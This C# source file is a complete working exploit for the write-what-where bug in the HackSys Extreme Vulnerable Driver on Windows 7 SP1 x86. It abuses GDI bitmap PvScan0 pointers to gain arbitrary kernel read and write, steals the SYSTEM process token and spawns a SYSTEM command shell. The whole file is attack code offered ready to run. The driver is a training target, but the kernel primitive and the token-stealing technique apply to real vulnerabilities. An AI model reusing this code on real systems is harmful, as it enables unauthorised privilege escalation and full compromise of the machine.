using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WriteWhatWhereGDI
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct WRITE_WHAT_WHERE
        {
            public IntPtr What;
            public IntPtr Where;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct GDI_PRIMITIVE_DATA
        {
            public IntPtr hBitmap;
            public IntPtr PvScan0;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct GDI_CELL
        {
            public IntPtr pKernelAddress;
            public short wProcessId;
            public short wCount;
            public short wUpper;
            public short wType;
            public IntPtr pUserAddress;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern bool EnumDeviceDrivers(
            IntPtr[] lpImageBase,
            int cb,
            ref int lpcbNeeded);

        [DllImport("psapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetDeviceDriverBaseName(
            IntPtr ImageBase,
            string lpFileName,
            int nSize);

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            int processInformationLength,
            ref int returnLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string lpProcName);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateBitmap(
            int nWidth,
            int nHeight,
            uint cPlanes,
            uint cBitsPerPel,
            IntPtr lpvBits);

        [DllImport("gdi32.dll")]
        static extern int SetBitmapBits(
            IntPtr hbmp,
            int cBytes,
            byte[] lpBits);

        [DllImport("gdi32.dll")]
        static extern int GetBitmapBits(
            IntPtr hbmp,
            int cbBuffer,
            IntPtr lpvBits);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref WRITE_WHAT_WHERE InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        // Global variables
        static IntPtr hDevice = IntPtr.Zero;
        static GDI_PRIMITIVE_DATA gdiManager = new GDI_PRIMITIVE_DATA();
        static GDI_PRIMITIVE_DATA gdiWorker = new GDI_PRIMITIVE_DATA();
        static WRITE_WHAT_WHERE www = new WRITE_WHAT_WHERE();

        // Helper functions
        static void Initialize()
        {
            gdiManager.hBitmap = IntPtr.Zero;
            gdiWorker.hBitmap = IntPtr.Zero;
        }

        static void CleanUp()
        {
            Console.WriteLine("[>] Cleaning up handle object(s)");
            if (hDevice != IntPtr.Zero)
            {
                if (CloseHandle(hDevice))
                {
                    hDevice = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }

            if (gdiManager.hBitmap != IntPtr.Zero)
            {
                if (CloseHandle(gdiManager.hBitmap))
                {
                    gdiManager.hBitmap = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a bitmap handle (code={0})", Marshal.GetLastWin32Error());
                }
            }

            if (gdiWorker.hBitmap != IntPtr.Zero)
            {
                if (CloseHandle(gdiWorker.hBitmap))
                {
                    gdiWorker.hBitmap = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a bitmap handle (code={0})", Marshal.GetLastWin32Error());
                }
            }
        }

        static bool IsWin7x86()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 6 && MinorVersion == 1 && BuildNumber == 7601 &&
                string.Compare(arch, "x86", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 7 SP1 x86 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static bool IsSystem()
        {
            string user = Environment.UserName;

            if (string.Compare(user, "SYSTEM", StringComparison.OrdinalIgnoreCase) == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool SpawnShell()
        {
            string ApplicationName = "C:\\Windows\\System32\\cmd.exe";
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            uint CREATE_NEW_CONSOLE = 0x00000010;
            string CurrentDirectory = "C:\\Windows\\System32";
            STARTUPINFO si = new STARTUPINFO();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool status = CreateProcess(
                ApplicationName, null, ref pSec, ref tSec, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, CurrentDirectory,
                ref si, out PROCESS_INFORMATION pi);

            if (status)
            {
                Console.WriteLine("[+] Shell is spawned successfully (PID = {0})", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, 500);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[!] Failed to spawn shell (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static IntPtr GetKernelBase()
        {
            IntPtr KernelBase = IntPtr.Zero;
            IntPtr[] ImageBases = new IntPtr[512];
            int cb = ImageBases.Length * Marshal.SizeOf(typeof(IntPtr));
            int cbNeeded = 0;
            int NumberOfPointers;

            Console.WriteLine("[>] Searching kernel base");
            bool status = EnumDeviceDrivers(ImageBases, cb, ref cbNeeded);

            if (!status)
            {
                Console.WriteLine("[-] Failed to EnumDeviceDrivers (code={0})", Marshal.GetLastWin32Error());
                return KernelBase;
            }

            NumberOfPointers = cbNeeded / Marshal.SizeOf(typeof(IntPtr));

            int BytesReturned;
            string ImageNameBuffer;
            string ImageName;
            StringComparison comparison = StringComparison.OrdinalIgnoreCase;

            for (uint i = 0; i < NumberOfPointers; i++)
            {
                ImageNameBuffer = new String('\x00', 256);
                BytesReturned = GetDeviceDriverBaseName(ImageBases[i], ImageNameBuffer, ImageNameBuffer.Length);

                if (BytesReturned > 0)
                {
                    ImageName = ImageNameBuffer.Trim('\x00');

                    if (string.Equals(ImageName, "ntoskrnl.exe", comparison))
                    {
                        Console.WriteLine("[+] Found kernel base: {0} @ 0x{1}", ImageName, ImageBases[i].ToString("X"));
                        KernelBase = ImageBases[i];
                        return KernelBase;
                    }
                    else if (string.Equals(ImageName, "ntkrnlpa.exe", comparison))
                    {
                        Console.WriteLine("[+] Found kernel base: {0} @ 0x{1}", ImageName, ImageBases[i].ToString("X"));
                        KernelBase = ImageBases[i];
                        return KernelBase;
                    }
                }
            }

            return KernelBase;
        }

        static bool GetGDIPrimitive(IntPtr hDevice)
        {
            // Step 1: Get PEB base address
            IntPtr hProcess;
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int PbiSize = Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
            int BytesReturned = 0;
            int ntstatus;
            int NT_SUCCESS = 0;
            IntPtr PebBase;

            Console.WriteLine("[>] Trying to get PEB Base");
            hProcess = (Process.GetCurrentProcess()).Handle;
            ntstatus = NtQueryInformationProcess(hProcess, 0, ref pbi, PbiSize, ref BytesReturned);

            if (ntstatus != NT_SUCCESS)
            {
                Console.WriteLine("[-] Failed to  NtQueryInformationProcess (ntstatus=0x{0})", ntstatus.ToString("X8"));
                return false;
            }

            PebBase = pbi.PebBaseAddress;
            Console.WriteLine("[+] PEB is at 0x{0}", PebBase.ToString("X8"));

            // Step 2: Create a bitmap object
            Console.WriteLine("[>] Creating 2 bitmap objects");
            gdiManager.hBitmap = CreateBitmap(0x64, 0x64, 1, 32, IntPtr.Zero);
            gdiWorker.hBitmap = CreateBitmap(0x64, 0x64, 1, 32, IntPtr.Zero);

            if ((gdiManager.hBitmap == IntPtr.Zero) || (gdiWorker.hBitmap == IntPtr.Zero))
            {
                Console.WriteLine("[-] Failed to create bitmap objects (code={0})", Marshal.GetLastWin32Error());
                return false;
            }
            Console.WriteLine("[+] hBitmap for Manager is 0x{0}", (gdiManager.hBitmap).ToString("X8"));
            Console.WriteLine("[+] hBitmap for Worker is 0x{0}", (gdiWorker.hBitmap).ToString("X8"));

            // Step 3: Calculate GDIKernelAddress
            int gdiCellSize = Marshal.SizeOf(typeof(GDI_CELL));
            IntPtr pGdiSharedHandleTable = new IntPtr(PebBase.ToInt32() + 0x94);
            IntPtr GdiSharedHandleTable = new IntPtr(Marshal.ReadInt32(pGdiSharedHandleTable));
            IntPtr SharedHandleEntryManager = new IntPtr(GdiSharedHandleTable.ToInt32() + ((gdiManager.hBitmap).ToInt32() & 0xFFFF) * gdiCellSize);
            IntPtr GDIKernelAddressManager = new IntPtr(Marshal.ReadInt32(SharedHandleEntryManager));
            IntPtr SharedHandleEntryWorker = new IntPtr(GdiSharedHandleTable.ToInt32() + ((gdiWorker.hBitmap).ToInt32() & 0xFFFF) * gdiCellSize);
            IntPtr GDIKernelAddressWorker = new IntPtr(Marshal.ReadInt32(SharedHandleEntryWorker));

            gdiManager.PvScan0 = new IntPtr(GDIKernelAddressManager.ToInt32() + 0x30);
            gdiWorker.PvScan0 = new IntPtr(GDIKernelAddressWorker.ToInt32() + 0x30);

            Console.WriteLine("[>] Calculating PvScan0 addresses");
            Console.WriteLine("    |-> PvScan0 for Manager is at 0x{0}", (gdiManager.PvScan0).ToString("X8"));
            Console.WriteLine("    |-> PvScan0 for Worker is at 0x{0}", (gdiWorker.PvScan0).ToString("X8"));

            Console.WriteLine("[>] Overwriting PvScan0 for the GDI Manager object");
            www.What = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            Marshal.Copy(BitConverter.GetBytes((gdiWorker.PvScan0).ToInt32()), 0, www.What, Marshal.SizeOf(typeof(IntPtr)));
            www.Where = gdiManager.PvScan0;
            uint ioctl = 0x22200B;

            bool status = DeviceIoControl(
                hDevice, ioctl, ref www,
                Marshal.SizeOf(typeof(WRITE_WHAT_WHERE)),
                IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send overwrite PvScan0 (code={0})", Marshal.GetLastWin32Error());
                return false;
            }
            Marshal.FreeHGlobal(www.What);
            return true;
        }

        static int ReadDword(IntPtr where)
        {
            IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            int result;

            SetBitmapBits(gdiManager.hBitmap, Marshal.SizeOf(typeof(IntPtr)), BitConverter.GetBytes(where.ToInt32()));
            GetBitmapBits(gdiWorker.hBitmap, Marshal.SizeOf(typeof(IntPtr)), buffer);

            result = Marshal.ReadInt32(buffer);
            Marshal.FreeHGlobal(buffer);

            return result;
        }

        static void WriteDword(byte[] data, IntPtr where)
        {
            SetBitmapBits(gdiManager.hBitmap, Marshal.SizeOf(typeof(IntPtr)), BitConverter.GetBytes(where.ToInt32()));
            SetBitmapBits(gdiWorker.hBitmap, Marshal.SizeOf(typeof(IntPtr)), data);
        }

        static bool DuplicateSystemToken(IntPtr SystemEPROCESS, int TargetPID)
        {
            IntPtr pSystemToken = new IntPtr(SystemEPROCESS.ToInt32() + 0xF8);
            IntPtr pProcessToken = IntPtr.Zero;
            IntPtr NextProcess;
            int SystemToken;
            int NextPID;
            int OffsetActiveProcessLinks = 0xB8;
            int OffsetUniqueProcessId = 0xB4;

            Console.WriteLine("[>] Searching our _EPROCESS");
            NextProcess = new IntPtr(
                ReadDword(new IntPtr(SystemEPROCESS.ToInt32() + OffsetActiveProcessLinks)) -
                OffsetUniqueProcessId - Marshal.SizeOf(typeof(IntPtr)));

            for (int i = 0; i < 100; i++)
            {
                NextPID = ReadDword(new IntPtr(NextProcess.ToInt32() + OffsetUniqueProcessId));
                if (NextPID == TargetPID)
                {
                    pProcessToken = new IntPtr(NextProcess.ToInt32() + 0xF8);
                    Console.WriteLine("[+] Got target _EPROCESS");
                    Console.WriteLine("    |-> PID: {0}", NextPID);
                    Console.WriteLine("    |-> _EPROCESS Address: 0x{0}", NextProcess.ToString("X8"));
                    Console.WriteLine("    |-> Token Address: 0x{0}", pProcessToken.ToString("X8"));
                    break;
                }
                NextProcess = new IntPtr(
                    ReadDword(new IntPtr(NextProcess.ToInt32() + OffsetActiveProcessLinks)) -
                    OffsetUniqueProcessId - Marshal.SizeOf(typeof(IntPtr)));
            }

            if (pProcessToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get target _EPROCESS");
                return false;
            }

            Console.WriteLine("[>] Duplicating SYSTEM token to our process token");
            SystemToken = ReadDword(pSystemToken);
            WriteDword(BitConverter.GetBytes(SystemToken), pProcessToken);

            return true;
        }

        // Main function
        static void Main()
        {
            Initialize();
            Console.WriteLine("--[ HEVD Exploitation : Write-What-Where GDI Version\n");

            if (!IsWin7x86())
            {
                return;
            }

            // Step 1: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 2: Create bitmap primitives
            bool status = GetGDIPrimitive(hDevice);

            if (!status)
            {
                Console.WriteLine("[-] Failed to create bitmap primitives");
                CleanUp();
                return;
            }
            Console.WriteLine("[+] GDI primitive setup is successful");

            // Step 3: Get SYSTEM _EPROCESS
            IntPtr KernelBase = GetKernelBase();
            IntPtr KernelBaseUser;
            IntPtr pPsInitialSystemProcess;
            IntPtr PsInitialSystemProcess;
            IntPtr SystemEPROCESS;
            KernelBaseUser = LoadLibrary("ntkrnlpa.exe");

            if (KernelBaseUser == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to LoadLibrary (code={0})", Marshal.GetLastWin32Error());
                CleanUp();
                return;
            }

            pPsInitialSystemProcess = GetProcAddress(KernelBaseUser, "PsInitialSystemProcess");

            if (pPsInitialSystemProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to GetProcAddress (code={0})", Marshal.GetLastWin32Error());
                CleanUp();
                return;
            }
            PsInitialSystemProcess = new IntPtr(KernelBase.ToInt32() + (pPsInitialSystemProcess.ToInt32() - KernelBaseUser.ToInt32()));
            Console.WriteLine("[+] PsInitialSystemProcess = 0x{0}", PsInitialSystemProcess.ToString("X8"));

            SystemEPROCESS = new IntPtr(ReadDword(PsInitialSystemProcess));
            Console.WriteLine("[+] SYSTEM _EPROCESS = 0x{0}", SystemEPROCESS.ToString("X8"));

            // Step 4: Token Stealing
            int TargetPID = (Process.GetCurrentProcess()).Id;
            if (!DuplicateSystemToken(SystemEPROCESS, TargetPID))
            {
                Console.WriteLine("[-] Failed to token stealing");
                CleanUp();
                return;
            }
            CleanUp();

            // Step 5: Spawn SYSTEM shell
            if (IsSystem() && SpawnShell())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit");
            }
        }
    }
}